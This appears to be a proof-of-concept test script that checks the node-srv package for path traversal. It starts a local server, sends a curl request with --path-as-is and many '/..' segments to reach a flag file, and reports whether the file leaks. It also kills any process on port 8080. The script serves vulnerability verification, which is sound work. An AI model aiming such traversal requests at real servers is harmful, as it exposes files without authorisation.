const path = require("path");
const pathToFlag = path.resolve("D:\\flag.html");
function genstr(n) {
  return "/..".repeat(50) + "\\flag.html";
}
// test("Path Traversal in node-srv", (done) => {
//   expect.assertions(1);
  let Server = require("node-srv");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8080/tcp", () => {});
  } catch (e) {}
  let srv = new Server(
    {
      port: 8085,
      root: "./",
      logs: true,
    },
    function () {}
  );
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8085${genstr()}"`;
  exec(attack_string, (error, stdout) => {
if (stdout == hostsFile) {
	console.log("this_is_vulnerable")
	process.exit(0);
} else {
	console.log("this_is_OK")
	process.exit(0);
}
    srv.stop();
//     done();
  });
// });
